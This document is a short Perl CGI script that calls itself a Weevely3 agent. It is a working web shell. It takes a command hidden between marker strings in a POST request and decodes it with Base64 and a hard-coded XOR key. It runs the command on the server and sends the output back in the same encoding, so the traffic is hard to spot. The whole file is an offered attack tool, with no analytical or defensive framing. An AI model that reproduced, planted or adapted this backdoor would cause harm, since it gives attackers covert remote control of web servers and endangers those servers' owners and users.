b'\n\n#!/usr/bin/env perl\nuse strict;\nuse warnings;\nuse MIME::Base64;\n\n# Weevely3 Perl CGI Agent\n# Implements XOR -> Base64 protocol (No GZIP to avoid non-core deps)\n\nmy $k = "5f4dcc3b";\nmy $kh = "5aa765d61d83";\nmy $kf = "27deb882cf99";\nmy $p = "kO4hSnBfmEYsqNbD";\n\nprint "Content-Type: text/plain\\n\\n";\n\nif ($ENV{\'REQUEST_METHOD\'} eq \'POST\') {\n    read(STDIN, my $content, $ENV{\'CONTENT_LENGTH\'});\n    \n    my $start = index($content, $kh);\n    my $end = index($content, $kf);\n    \n    if ($start != -1 && $end != -1) {\n        my $payload = substr($content, $start + length($kh), $end - ($start + length($kh)));\n        \n        # Decode: Base64 -> XOR\n        my $decoded = decode_base64($payload);\n        my $unxorred = xor_str($decoded, $k);\n        \n        # Execute\n        my $output = `$unxorred 2>&1`;\n        \n        # Encode: XOR -> Base64\n        my $re_xorred = xor_str($output, $k);\n        my $encoded = encode_base64($re_xorred, "");\n        \n        print $p . $kh . $encoded . $kf;\n    }\n}\n\nsub xor_str {\n    my ($text, $key) = @_;\n    my $res = "";\n    my $klen = length($key);\n    \n    for (my $i = 0; $i < length($text); $i++) {\n        $res .= chr(ord(substr($text, $i, 1)) ^ ord(substr($key, $i % $klen, 1)));\n    }\n    return $res;\n}\n'
